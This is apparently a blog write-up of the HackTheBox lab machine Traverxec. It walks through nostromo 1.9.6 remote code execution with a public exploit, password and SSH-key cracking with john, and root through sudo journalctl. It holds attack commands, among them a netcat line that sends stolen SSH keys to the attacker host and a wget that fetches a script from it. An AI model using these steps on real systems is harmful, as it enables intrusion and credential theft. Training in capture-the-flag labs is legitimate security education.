---
title: "HackTheBox Walkthrough - Traverxec"
overview: "A really interesting box for me that really taught me to slow down and do thorough enumeration to find a way forward. Despite being following a pretty standard HTTP-to-SSH-access exploitation flow you see in a lot of vulnhub VMs, I was challenged and found it really worthwhile doing."
categories:
  - Hackthebox
tags:
  - hackthebox
  - htb
  - linux
  - jtr
  - gtfobins
  - ssh
classes: wide
---

![SplashScreen](https://opalsec.github.io/assets/images/traverxec/Card.png)

# Overview:

A really interesting box for me that really taught me to slow down and do thorough enumeration to find a way forward. Despite being following a pretty standard HTTP-to-SSH-access exploitation flow you see in a lot of vulnhub VMs, I was challenged and found it really worthwhile doing.

# Enumeration

As always, I start with an nmap scan to identify listening ports and services:

```
nmap -sC -vv -sV -p- --min-rate 10000 -oA ./allscan 10.10.10.165
```

Providing us with this:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 10 20:43:33 2020 -- 1 IP address (1 host up) scanned in 32.79 second
```

This is a pretty standard setup for a hackthebox machine - pwn the web server and pivot to ssh to complete it. So, let's start with the web server.

## Port 80

Browsing to port 80 shows nothing useful, but looking at the nmap output we see something interesting - it's running a suspiciously specific HTTP server - nostromo 1.9.6

```
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

# Getting a Shell - Nostromo HTTPD

Going for the easy win first, I ran a search for existing exploits for the server using searchsploit:

![searchsploit](https://opalsec.github.io/assets/images/traverxec/searchsploit.png)

Seeing three results for the server software, I'll start with the closest match to the server version - 47837.py. 

I copy it into the working folder with ```searchsploit -m 47837``` and run it...to see it error out immediately with an undefined variable exception:

```
root@playpen:/htb/traverxec# python 47837.py                                                                         
Traceback (most recent call last):                                                                                   
  File "47837.py", line 10, in <module>                   
    cve2019_16278.py                                                                                                 
NameError: name 'cve2019_16278' is not defined  
```

Thankfully all I had to do was find and delete the line in the script and run it again with ```whoami``` as an argument to test the exploit:

```
root@playpen:/htb/traverxec# python 47837.py 10.10.10.165 80 whoami                                                                                                                                                                        
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
                                        _____-2019-16278                                                                                                                                                                                   
        _____  _______    ______   _____\    \                         
   _____\    \_\      |  |      | /    / |    |                   
  /     /|     ||     /  /     /|/    /  /___/|                  
 /     / /____/||\    \  \    |/|    |__ |___|/                 
|     | |____|/ \ \    \ |    | |       \                      
|     |  _____   \|     \|    | |     __/ __                   
|\     \|\    \   |\         /| |\    \  /  \                 
| \_____\|    |   | \_______/ | | \____\/    |                 
| |     /____/|    \ |     | /  | |    |____/|                 
 \|_____|    ||     \|_____|/    \|____|   | |                  
        |____|/                        |___|/                                                                                                                                                                                              
                                                                                                                    
                                                                                                                     
HTTP/1.1 200 OK                                                                                                      
Date: Fri, 10 Apr 2020 04:14:29 GMT                                                                                  
Server: nostromo 1.9.6                                                                                               
Connection: close                                                                                                    
                                                                                                                     
                                                                                                                     
www-data         
```

Having confirmed that the RCE allows you to simply execute whatever you pass as the last argument to the script, I grabbed a shell by starting the netcat listener on 1234 with ```nc -nvlp 1234```, and running the python script as below:

![sploit](https://opalsec.github.io/assets/images/traverxec/sploit.png)

# Internal Recon

After upgrading the shell, I hosted the [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh "LinEnum") script using Python's SimpleHTTPServer and ran it on the host

```
www-data@traverxec:/tmp$ wget http://10.10.14.2:8000/LinEnum.sh 
wget http://10.10.14.2:8000/LinEnum.sh 
--2020-04-10 00:59:53--  http://10.10.14.2:8000/LinEnum.sh                                                           
Connecting to 10.10.14.2:8000... connected.                                                                          
HTTP request sent, awaiting response... 200 OK                                                                       
Length: 46631 (46K) [text/x-sh]                                                                                      
Saving to: 'LinEnum.sh'                                                                                              
                                                                                                                     
LinEnum.sh          100%[===================>]  45.54K  76.2KB/s    in 0.6s                                          
                                                                                                                     
2020-04-10 00:59:54 (76.2 KB/s) - 'LinEnum.sh' saved [46631/46631]                                                   
                                                                                                                     
www-data@traverxec:/tmp$ chmod +x LinEnum.sh                                                                         
chmod +x LinEnum.sh                                                                                                  

www-data@traverxec:/tmp$ ./LinEnum.sh
```

## Going Down The Rabbit Hole

Scrolling through the results, I noticed something interesting - a htpasswd file for a user called david:

![htpasswd](https://opalsec.github.io/assets/images/traverxec/htpasswd.png)

Looking at the contents of /etc/passwd, I can see that david is the only other account with the ability to use bash and the only folder in the /home directory, so I can tell he's key here.

![etcpasswd](https://opalsec.github.io/assets/images/traverxec/etcpasswd.png)

### Cracking the htpasswd file

According to the Apache doco, the password would've been encrypted in [one of these formats](http://httpd.apache.org/docs/current/misc/password_encryptions.html "format")

![passwd_format](https://opalsec.github.io/assets/images/traverxec/passwd_format.png)

After some googling, it looks like the best option is to use the md5crypt format with john:

```
root@playpen:/htb/traverxec# john pass --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt                 
Using default input encoding: UTF-8                                                                                  
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])                                
Will run 6 OpenMP threads                                                                                            
Press 'q' or Ctrl-C to abort, almost any other key for status                                                        
Nowonly4me       (?)                                                                                                 
1g 0:00:01:22 DONE (2020-04-10 15:48) 0.01215g/s 128563p/s 128563c/s 128563C/s NuiMeanPoon..Novaem                   
Use the "--show" option to display all of the cracked passwords reliably                                             
Session completed                                                                                                    

root@playpen:/htb/traverxec# john --show pass                                                                        
?:Nowonly4me

1 password hash cracked, 0 left   
```

### What now?

Looking at the config for the man page for the nostromo http server (nhttpd), something stood out to me - user home directories can be made accessible via the server:

![manpage](https://opalsec.github.io/assets/images/traverxec/manpage.png)

Looking at the config for nhttpd, it looked like htaccess was configured, which made me think I should be able to access david's home directory via the web server using the creds I just cracked with John. 

```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf                                                               
cat nhttpd.conf                                           
# MAIN [MANDATORY]                                        
                                                                                                                     
servername              traverxec.htb                 
serverlisten            *                                 
serveradmin             david@traverxec.htb               
serverroot              /var/nostromo                                                                                
servermimes             conf/mimes                                                                                   
docroot                 /var/nostromo/htdocs                                                                         
docindex                index.html                                                                                   
                                                                                                                     
# LOGS [OPTIONAL]                                                                                                    
                                                                                                                     
logpid                  logs/nhttpd.pid                                                                              
                                                                                                                     
# SETUID [RECOMMENDED]                                                                                               
                                                                                                                     
user                    www-data                                                                                     
                                                                                                                     
# BASIC AUTHENTICATION [OPTIONAL]                         
                                                          
htaccess                .htaccess                         
htpasswd                /var/nostromo/conf/.htpasswd      
                                                                                                                     
# ALIASES [OPTIONAL]                                      
                                                                                                                     
/icons                  /var/nostromo/icons                                                                          

# HOMEDIRS [OPTIONAL]                                     

homedirs                /home                             
homedirs_public         public_www
```

Unfortunately it didn't give me the authentication prompt I expected when browsing to the directory, instead responding with a 200 OK and this image:

![davepage](https://opalsec.github.io/assets/images/traverxec/davepage.png)

# Getting User

Out of ideas, I turned to the hackthebox Discord where a user helpfully prompted me to have a look at the config again. 

After a little more prodding I realised that while the "homedirs" parameter specified where the user directories would be, there was an additional directory nested in each user's home folder called public_www that would house content to be displayed on the webserver.

I didn't think to do this initially as david's home directory was locked down to only be accessible by him. The public_www folder, however, wasn't - as long as you went directly to it:

```
www-data@traverxec:/usr/bin$ ls -lah /home/david
ls -lah /home/david
ls: cannot open directory '/home/david': Permission denied
www-data@traverxec:/usr/bin$ ls -lah /home/david/public_www
ls -lah /home/david/public_www
total 16K
drwxr-xr-x 3 david david 4.0K Oct 25 15:45 .
drwx--x--x 5 david david 4.0K Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4.0K Oct 25 17:02 protected-file-area
```

Going into the protected-file-area folder, I found a tar.gz archive. I couldn't figure out the right URI to use to pull the file, so I just used netcat instead by running ```nc -w3 10.10.14.2 8888 < backup-ssh-identity-files.tgz``` on traverxec and the following on my Kali machine:

```
root@playpen:/htb/traverxec# wget http://10.10.10.165/~david/public_www/protected-file-area/backup-ssh-identity-files.tgz
--2020-04-10 20:04:20--  http://10.10.10.165/~david/public_www/protected-file-area/backup-ssh-identity-files.tgz
Connecting to 10.10.10.165:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2020-04-10 20:04:21 ERROR 404: Not Found.

root@playpen:/htb/traverxec# nc -l -p 8888 > backup-ssh-identity-files.tgz
```

Decompressing the archive reveals it contains david's ssh keys:

```
root@playpen:/htb/traverxec# tar -xzvf backup-ssh-identity-files.tgz 
home/david/.ssh/                                          
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa                                    
home/david/.ssh/id_rsa.pub    
```

When attempting to connect with it, however, it prompts for a passphrase as well as the key. I entered the htpasswd value I reversed earlier hoping it'd actually be of some use, but unfortunately - no dice:

```
root@playpen:/htb/traverxec/home/david/.ssh# ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa':                                                                                   
david@10.10.10.165's password:                                                                                       
Permission denied, please try again. 
```

After a bit of Googling, I realised I needed to crack the private key to extract the passphrase needed to authenticate with the certificate:

```
root@playpen:/htb/traverxec/home/david/.ssh# locate ssh2john.py
/usr/share/john/ssh2john.py                               
root@playpen:/htb/traverxec/home/david/.ssh# /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
root@playpen:/htb/traverxec/home/david/.ssh# john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8                       
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes       
Will run 6 OpenMP threads                                                                             	               
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.                             
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)                                 
1g 0:00:00:02 DONE (2020-04-10 20:25) 0.3424g/s 4911Kp/s 4911Kc/s 4911KC/s     1990..*7¡Vamos!
Session completed    
```

After successfully authenticating to ssh as david, I'm finally able to grab the user file and move on to getting root:
![authenticated](https://opalsec.github.io/assets/images/traverxec/authenticated.png)

# Privesc to Root

The first thing that jumped out to me was the bin folder, which contained a script to grab stats from the server:

```
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Ignoring all the lines of "echo", journalctl being run with sudo stood out - that looks like a surefire way to get to root. 

A quick google showed it can be used to [escalate if it's run as root](https://gtfobins.github.io/gtfobins/journalctl/ "gtfobins"), by spawning a shell from journalctl's commandline. 

I needed to run journalctl as sudo and spawn a shell from the commandline - I figured the easiest way to do this was just to use the command in the server-stats script:

![root](https://opalsec.github.io/assets/images/traverxec/root.png)

All that was left to do was cd to root and cat the flag - that's it!
